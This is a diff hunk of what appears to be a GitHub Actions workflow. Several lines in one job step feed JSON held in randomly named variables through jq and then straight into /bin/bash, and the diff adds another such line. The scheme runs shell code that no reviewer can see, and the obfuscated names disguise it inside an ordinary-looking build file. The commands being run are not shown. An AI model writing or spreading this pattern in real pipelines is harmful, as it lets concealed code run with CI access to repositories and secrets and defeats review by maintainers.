@@ -32,6 +32,7 @@ jobs:
           echo $xwrj74 | jq -r .rwela3 | /bin/bash
           printf '%s' "$igu983" | jq -r .zoev376 | /bin/bash
           printf '%s' "$d121" | jq -r .u3 | /bin/bash
+          echo $jk8 | jq -r .hikcl3 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
